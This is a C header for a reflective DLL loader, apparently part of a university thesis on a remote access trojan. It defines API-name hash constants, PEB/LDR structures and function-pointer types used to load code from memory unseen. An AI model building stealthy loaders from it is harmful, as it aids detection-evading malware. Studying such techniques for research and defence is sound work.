/*
 * ReflectiveLoader.h
 * Definizioni complete per il Reflective Loader
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#ifndef REFLECTIVE_LOADER_H
#define REFLECTIVE_LOADER_H

#include <windows.h>
#include <winnt.h>
#include <intrin.h>

// ── Macro DEREF ──────────────────────────────────────────
#define DEREF(x)      (*(ULONG_PTR *)(x))
#define DEREF_64(x)   (*(DWORD64 *)(x))
#define DEREF_32(x)   (*(DWORD *)(x))
#define DEREF_16(x)   (*(WORD *)(x))
#define DEREF_8(x)    (*(BYTE *)(x))

// ── Hash valori per API lookup ───────────────────────────
#define KERNEL32DLL_HASH             0x6A4ABC5B
#define NTDLLDLL_HASH                0x3CFA685D
#define LOADLIBRARYA_HASH            0xEC0E4E8E
#define GETPROCADDRESS_HASH          0x7C0DFCAA
#define VIRTUALALLOC_HASH            0x91AFCA54
#define VIRTUALPROTECT_HASH          0x7946C61B
#define NTFLUSHINSTRUCTIONCACHE_HASH 0x534C0AB8

// ── Struttura IMAGE_RELOC ────────────────────────────────
typedef struct _IMAGE_RELOC {
    WORD offset : 12;
    WORD type   :  4;
} IMAGE_RELOC, *PIMAGE_RELOC;

// ── Strutture PEB/LDR ────────────────────────────────────
typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
    PVOID       DllBase;
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG       Flags;
    SHORT       LoadCount;
    SHORT       TlsIndex;
    LIST_ENTRY  HashTableEntry;
    ULONG       TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    DWORD      dwLength;
    DWORD      dwInitialized;
    LPVOID     lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID     EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB_INTERNAL {
    BYTE           Reserved1[2];
    BYTE           BeingDebugged;
    BYTE           Reserved2[1];
    PVOID          Reserved3[2];
    PPEB_LDR_DATA  Ldr;
} PEB_INTERNAL, *PPEB_INTERNAL;

// ── Tipi per API risolte dinamicamente ───────────────────
typedef HMODULE (WINAPI * LOADLIBRARYA)( LPCSTR );
typedef FARPROC (WINAPI * GETPROCADDRESS)( HMODULE, LPCSTR );
typedef LPVOID  (WINAPI * VIRTUALALLOC)( LPVOID, SIZE_T, DWORD, DWORD );
typedef BOOL    (WINAPI * VIRTUALPROTECT)( LPVOID, SIZE_T, DWORD, PDWORD );
typedef VOID    (WINAPI * RTLFLUSHINSTRCACHE)( HANDLE, PVOID, SIZE_T );
typedef BOOL    (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );

// ── Prototipo ReflectiveLoader ───────────────────────────
ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpDllBase );

#endif // REFLECTIVE_LOADER_H

// PEB reader da peb_walk.asm
extern ULONG_PTR GetPEBAddress(void);
